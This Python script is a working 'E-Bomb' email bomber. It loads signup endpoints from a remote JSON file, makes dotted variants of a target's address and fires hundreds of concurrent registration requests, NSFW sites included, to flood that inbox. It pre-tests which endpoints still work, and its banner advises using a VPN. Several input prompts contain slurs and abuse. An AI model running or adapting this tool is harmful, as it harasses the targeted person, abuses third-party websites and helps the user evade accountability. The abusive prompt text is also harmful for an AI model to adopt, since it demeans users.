# Notes to self:
# The title bar still isnt working on arch linux and causes .json errors
# Need to work on multi-threading when it comes to running the process
# Adding more logging for the websites when it comes to the errors etc. like the 404, 403, api errors etc
# Gonna push this to the github later today


import asyncio, aiohttp, time, re, random, string, itertools, os, json, pystyle, fade, sys, colorama, threading, requests, trio
from pystyle import Center
from colorama import Fore, Style, init
from pathlib import Path

size = 600  # Threads + Process / Iterations
cap = None  # thread cap
random_threads = True  # randomises
include_nsfw_sites = True  
include_special_characters = True 

timeout = aiohttp.ClientTimeout(total=20)
init(autoreset=True)

def restart_main():
    asyncio.run(main())

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def update_title():
    while True:
        title = "[t.me/influenceable]" + "".join(
            random.choices(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                k=30,
            )
        )
        os.system(
            f"title {title}" if os.name == "nt" else f"\033]0;{title}\007"
        )
        time.sleep(0.3)

def credit():
    clear_console()
    print(Center.XCenter(faded_credits))
    time.sleep(5)

def generate_email_variants(email):
    username, domain = email.split("@")
    variants = []
    funnylimit = 5000

    for i in range(1, len(username)):
        if len(variants) >= funnylimit:
            break
        for combo in itertools.combinations(range(1, len(username)), i):
            if len(variants) >= funnylimit:
                break
            variant = username
            for index in reversed(combo):
                if len(variants) >= funnylimit:
                    break
                variant = variant[:index] + "." + variant[index:]
            variants.append(variant)

    data = list(
        sorted(dict.fromkeys([variant + "@" + domain for variant in variants]))
    )
    results = [email] + random.sample(data, k=len(data))
    return results


def generate(length: int = 5):
    ba = bytearray(os.urandom(length))
    for i, b in enumerate(ba):
        ba[i] = ord("a") + b % 26
    return str(time.time()).replace(".", "") + ba.decode("ascii")

def validate_email(email):
    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email)

def is_html_string(text: str) -> bool:
    return bool(re.compile(r"<[^>]+>").search(text))

def clamp(value, min_value, max_value):
    return max(min_value, min(value, max_value))

def divide():
    print("-" * 40)

progress = 0

def update_progress():
    global progress
    progress += 1
    decimal = progress / total
    amount = 30
    white = "█" * int(amount - int((1 - decimal) * amount))
    black = "░" * int(amount - int(decimal * amount))
    print(
        f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」",
        end="\r",
    )
    if progress >= total:
        print("\r")


status_codes = {}
working = []


async def fetch(
    session: aiohttp.ClientSession,
    sub: str,
    info,
    name: str = None,
    debugging: bool = False
):
    replacements = {}
    def fix(lol):
        try:
            required = isinstance(lol, (dict, tuple, list))
            result = (required and json.dumps(lol)) or lol
            result = result.replace("{email}", sub).replace("{password}", password).replace("{random}", generate()).replace("{username}", generate()).replace("{timestamp}", str(int(time.time())))
            for k, v in replacements.items():
                print(k, v)
                result = result.replace(k, v)
            result = (required and json.loads(result)) or result
        except Exception:
            import traceback
            print(traceback.format_exc())
        return result

    try:
        # asdf

        requirements = info.get("requirements")
        if requirements:
            for thing in requirements:
                async with session.request(
                    method=thing.get("method", "GET"),
                    url=thing.get("url"),
                    headers=info.get("headers")
                ) as resp:
                    for cookie in thing.get("cookies", []):
                        replacements[cookie.get("name")] = resp.cookies.get(cookie.get("key")).value
                    for header in thing.get("headers", []):
                        replacements[header.get("name")] = resp.headers.get(header.get("key"))

        print(requirements)

        # asdf
        url = fix(info.get("url"))
        method = info.get("method", "POST").upper()
        js = info.get("json")
        if js is not None:
            js = fix(js)
        data = info.get("data")
        if data is not None:
            data = fix(data)
        params = info.get("params")
        if params is not None:
            params = fix(params)
        headers = info.get("headers", {})
        cookies = info.get("cookies", {})
        
        if debugging == True:
            print("json:", js)
            print("data:", data)
            print("params:", params)
            print("headers:", headers)
            print("cookies:", cookies)

        async with session.request(
            method=method,
            url=url,
            json=js,
            params=params,
            data=data,
            headers=headers,
            cookies=cookies,
            timeout=timeout,
        ) as resp:
            if status_codes.get(name) is None:
                status = resp.status
                resp = await resp.text()
                evaluation = "FAILURE" if status >= 400 else "SUCCESS"
                if is_html_string(resp):
                    words = [
                        "Denied",
                        "Error",
                        "Bad request",
                        "Bad",
                        "Wrong",
                        "Forbidden",
                        "Suspicious",
                        "Already in use",
                        "validation.email.duplicate",
                        "Suspicious request requires verification",
                        "Verifying your connection",
                        "The user already exists.",
                        "Internal error occurred",
                        "Something went wrong. Please try again",
                        "The request could not be satisfied",
                        "The requested resource could not be found.",
                        "Attention Required!",
                        "service disabled",
                        "Not Acceptable",
                        "Unauthorized",
                        "An error occured during registration",
                        "Current session has been terminated",
                        "Rate limited. Please try again later.",
                        "Token parameter is required",
                        "CAPTCHA verification failed",
                        "The user already exists.",
                        "An account using this email address has already been registered.",
                        "Permission Denied",
                    ]
                    if any([word in resp.lower() for word in words]):
                        evaluation = "FAILURE"
                        status = 400
                resp = (
                    resp.strip()
                    .replace("\n", "")
                    .replace("\r", "")
                    .replace("\t", "")[:1000]
                )
                if status_codes.get(name) is None:
                    status_codes[name] = {
                        "method": method,
                        "status": status,
                        "evaluation": evaluation,
                        "url": url,
                        "resp": resp,
                    }
    except (
        Exception,
        asyncio.CancelledError,
        AssertionError,
        TimeoutError,
    ) as err:
        pass
    return update_progress()


text = """   
                                       ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
                                       ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
                                       █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
                                       ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
                                       ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
                                       ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
                                                                      t.me/influenceable
                                                                       pls use a vpn :)
                                                        
                                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                        
"""

credits = """   
                             ███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
                             ██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
                             █████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
                             ██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
                             ███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
                             ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
                             
                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                    
                                             =+= Credits =+=
                                               Email Bomber
                                            Founder: Inkthirsty
                                            Sigma Dev: Disbuted  
                                       =+= Keep Open Source Open =+=
                                  
                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                  
"""


def menu():
    threading.Thread(target=update_title, daemon=True).start()
    clear_console()
    print(Center.XCenter(faded_text))
    print(
        f"\r\n                                                     [{blue_dash}] Main Menu:"
    )
    print(
        f"\r                                                     [{blue_dash}] 1. Start E-Bomb"
    )
    print(
        f"\r                                                     [{blue_dash}] 2. Credits"
    )
    print(
        f"\r                                                     [{blue_dash}] 3. Exit"
    )
    choice = input(
        "                                                     Enter your choice: "
    )
    return choice


faded_text = fade.purpleblue(text)
faded_credits = fade.purpleblue(credits)

yellow_dash = f"{Fore.YELLOW}-{Style.RESET_ALL}"
red_dash = f"{Fore.RED}-{Style.RESET_ALL}"
green_dash = f"{Fore.GREEN}-{Style.RESET_ALL}"
blue_dash = f"{Fore.BLUE}-{Style.RESET_ALL}"


async def main(): 
    clear_console()
    print(Center.XCenter(faded_text))
    try:
        async with aiohttp.ClientSession() as session:
            directory = os.path.dirname(__file__)
            try:
                with open(
                    os.path.join(directory, "functions.json"), "r"
                ) as file:
                    functions = json.load(file)
            except Exception:
                print(f"\r[{red_dash}] No Data Found, Refering To Backup Data")
                time.sleep(0.5)
                clear_console()
                print(Center.XCenter(faded_text))
                print(f"\r[{yellow_dash}] Connecting now...")
                time.sleep(1)
                async with session.get(
                    "https://rawcdn.githack.com/Inkthirsty/Email-Spammer/ce70ff9a875692f37d7fca5aedae2db7e93c1f11/functions.json"  # changed to
                ) as resp:
                    functions = json.loads(await resp.text())
                    clear_console()
                    print(Center.XCenter(faded_text))
                    print(
                        f"\r[{green_dash}] Backup Valid! Program Should Be Working Now."
                    )
                    time.sleep(1.5)
                    clear_console()
                    print(Center.XCenter(faded_text))

            # functions = {i: functions[i] for i in list(functions)[:-1]}
            functions = {
                i: functions[i]
                for i in list(functions)
                if i != "example"
                and (
                    (include_nsfw_sites == True and functions[i].get("nsfw"))
                    or not functions[i].get("nsfw")
                )
            }
            global progress, total, password, threads
            password = ""
            samples = [
                string.ascii_lowercase,
                string.ascii_uppercase,
                string.digits,
            ]

            if include_special_characters:
                samples.append(
                    string.punctuation
                ) 

            for sample in samples:
                password += "".join(random.sample(sample, k=5))

            password = "!" + "".join(random.sample(password, k=len(password)))

            email = None
            while True:
                email = (
                    input(f"\r[{yellow_dash}] Enter Your Email Address: ")
                    .strip()
                    .lower()
                )
                if validate_email(email):
                    break
                clear_console()
                print(Center.XCenter(faded_text))
                print(
                    f"\r[{red_dash}] That isnt a fucking email address you retard"
                )
                print(f"\r[{green_dash}] Lets try that again :)")
                time.sleep(2)
                await main()

            variants = generate_email_variants(email)
            threads = None
            while True:
                try:
                    limit = clamp(len(variants), 1, cap or float("inf"))
                    threads = (
                        input(
                            f"\r[{yellow_dash}] Threads per batch (1-{limit}): "
                        )
                        .strip()
                        .lower()
                    )
                    if threads == "":
                        threads = cap // 2
                    threads = clamp(int(threads), 1, limit)
                    break
                except Exception:
                    clear_console()
                    print(Center.XCenter(faded_text))
                    print(
                        f"\r[{red_dash}] Are you fucking retarded? That is not a number 🤬🤬"
                    )
                    print(f"\r[{green_dash}] Lets try that again :)")
                    time.sleep(2)
                    await main()

            variants = random.sample(variants, k=threads)
            total = len(functions) * len(variants)
            divide()
            print(f"\r[{green_dash}] Useless Infomation Here:")
            global debug
            debug = threads == 1
            info = {
                "EMAIL": email,
                "PASSWORD": password,
                "THREADS": threads,
                "ENDPOINTS": len(functions),
                "NSFW SITES": str(include_nsfw_sites).lower(),
                "DEBUG MODE": str(debug).lower(),
            }
            print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
            divide()
            if debug:
                testlast = (
                    input(
                        f"\r[{yellow_dash}] Debug Mode is active, type Y to only test the last function "
                    )
                    .strip()
                    .lower()
                    == "y"
                )
                if testlast:
                    total = 1
                    functions = dict([next(reversed(functions.items()))])
            else:
                print(
                    f"\r[{green_dash}] Pretesting endpoints to grant 2 minutes of life ♥ ♥ ♥"
                )
                test_tasks = [
                    asyncio.create_task(
                        fetch(session, email, values, name, debug)
                    )
                    for name, values in functions.items()
                ]
                total = len(test_tasks)
                try:
                    await asyncio.gather(*test_tasks)
                except Exception:
                    pass
                working = [
                    k for k, v in status_codes.items() if v.get("status") < 400
                ]
                print(
                    f"\r[{yellow_dash}] {len(working)}/{len(test_tasks)} endpoints may be working"
                )
                functions = {k: v for k, v in functions.items() if k in working}
                variants = variants[1:]
                print(
                    f"\r[{green_dash}] {len(test_tasks):,} endpoints have been tested -- {round((len(functions)/len(test_tasks))*100, 1):.1f}% success rate"
                )
                total = len(functions) * len(variants)
                progress = 0
            print(f"\r[{green_dash}] Initializing threads...")
            start = time.time()
            global timeout
            timeout = aiohttp.ClientTimeout(total=5)
            queue = [
                (session, sub, values, name)
                for sub in variants
                for name, values in functions.items()
            ]
            if random_threads == True:
                queue = random.sample(queue, k=len(queue))
            print(f"\r[{green_dash}] Sending Emails!")
            for j in range(0, len(queue), size):
                tasks = [
                    asyncio.create_task(fetch(*task))
                    for task in queue[j : j + size]
                ]
                try:
                    await asyncio.gather(*tasks)
                except Exception:
                    pass
                await asyncio.sleep(0)
            taken = time.time() - start
            minutes, seconds = int(taken // 60), int(taken % 60)
            print(
                f"\r[{green_dash}] Attempted to send {total:,} emails in {minutes}:{seconds:02}"
            )
            print(
                f"\r[{yellow_dash}] Remember that some emails will arrive late or never"
            )
            async with session.get(
                "https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json"
            ) as resp:
                words = ", ".join(random.sample(await resp.json(), k=5))
            prefix = "an" if words[0] in "aeiou" else "a"
            print(
                f"\r[{green_dash}] I hope you have {prefix} {words} day ^_^"
            )  # chelpus ahh code
            with open(
                os.path.join(directory, "results.txt"), "w", encoding="utf-8"
            ) as file:
                e = "\n\n".join(
                    [
                        (
                            f"{name or 'Unknown'} -- {values.get('method')} -- {values.get('status')} -- {values.get('evaluation')}\nURL: {values.get('url')}\nRESPONSE: {values.get('resp')}"
                        )
                        for name, values in status_codes.items()
                    ]
                )
                file.write(e)
            time.sleep(2)
            trio.run(menu)
    except Exception as error:
        print(error)
        print(
            f"\r[{red_dash}] It seems like the program has died before pope francis :(( womp womp"
        )
        await asyncio.sleep(5)
        sys.exit()  


if __name__ == "__main__":
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass
    while True:
        choice = menu()
        if choice == "1":
            asyncio.run(main())
        elif choice == "2":
            credit()
        elif choice == "3":
            clear_console()
            print(Center.XCenter(faded_text))
            print(
                f"\r\n                                                 [{green_dash}] Thank You For Using E-Bomb!"
            )
            time.sleep(3)  # why the fuck was this set to 20 seconds.... sigma
            sys.exit()
        else:
            clear_console()
            print("Invalid choice. Please try again.")
